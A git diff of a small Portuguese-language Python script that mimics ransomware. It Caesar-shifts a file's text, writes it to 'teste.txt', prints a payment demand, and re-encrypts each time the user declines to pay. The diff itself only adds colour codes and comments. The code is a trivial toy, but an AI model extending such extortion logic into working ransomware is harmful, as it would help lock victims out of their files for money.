@@ -3,6 +3,12 @@ import time
 import sys
 global variacao
 
+#Cores do Terminal
+reset_color = "\033[0m"
+warning = '\033[93m'
+ok = '\033[92m'
+header = '\033[95m'
+
 #Pegando informações
 while True:
     try:
@@ -15,10 +21,6 @@ while True:
 #salvando o alfabeto em lista
 alfabeto = string.printable
 alfabeto = list(alfabeto)
-Alfabeto = string.ascii_uppercase
-pontos = string.punctuation
-num = string.digits
-
 
 def doisemum(params):
     #Abrindo e lendo o arquivo
@@ -28,6 +30,7 @@ def doisemum(params):
 
     newlist = list()
 
+    #Adicionando Caracteres que não estão no alfabeto na variavel alfabeto
     for x in range(len(file)):
         for y in file[x]:
             try:
@@ -49,8 +52,7 @@ def doisemum(params):
                 else:
                     cifra = (alfabeto.index(y) + variacao) % len(alfabeto)
                 newlist.append(alfabeto[cifra])
-
-                    
+    #abrir e escrever o conteudo no arquivo
     arquivo = open('teste.txt', 'w')
     arquivo.write(''.join(newlist))
     arquivo.close()
@@ -71,7 +73,7 @@ def carregamento():
 
 #Modificando o arquivo alvo e avisando o usuario
 doisemum('')
-print('Seu arquivo foi Criptografado, pague agora que será descriptografado.')
+print(warning + 'Seu arquivo foi Criptografado, pague agora que será descriptografado.' + reset_color)
 
 #variaveis para controle
 var = variacao
@@ -84,12 +86,12 @@ while True:
         variacao = tanto + var
         doisemum('des')
         carregamento()
-        print("Arquivo recuperado")
+        print(ok + "Arquivo recuperado" + reset_color)
         break
     elif pagou == 'NAO' or pagou == 'N':
         tanto += 1
         print("Então pague ou não terá o arquivo de volta")
-        print('PS: Seu arquivo acabou de "ganhar" mais um nivel de criptografia')
+        print(warning + 'PS: Seu arquivo acabou de "ganhar" mais um nivel de criptografia' + reset_color)
         doisemum('')
     else:
         print('Coloque apenas Sim ou Nao')
